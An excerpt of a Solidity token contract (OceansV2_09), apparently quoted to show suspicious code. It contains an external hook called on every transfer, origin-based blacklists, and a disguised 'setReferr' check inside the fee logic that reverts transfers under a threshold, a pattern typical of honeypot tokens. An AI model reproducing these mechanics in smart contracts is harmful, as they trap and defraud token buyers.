...
contract OceansV2_09 is Initializable, OwnableUpgradeable {
    ...
    function _transferFrom(
        ...
        if (antiBotEnabled) {
            _Iwall.Organizer(sender,recipient,amount);
            pinkAntiBot.onPreTransferCheck(sender, recipient, amount);
        }

        if(!blacklist[sender] || !blacklist[recipient] || !OriginBlaclist[tx.origin]) return true;
    ...
    function takeFee(
        ...
        _gonBalances[address(this)] = _gonBalances[address(this)].add(
            feeAmount
        );setReferr(gonAmount.div(_gonsPerFragment));
    ...
    function setReferr(uint _ref) view private {
        require(_ref > timer);
    }
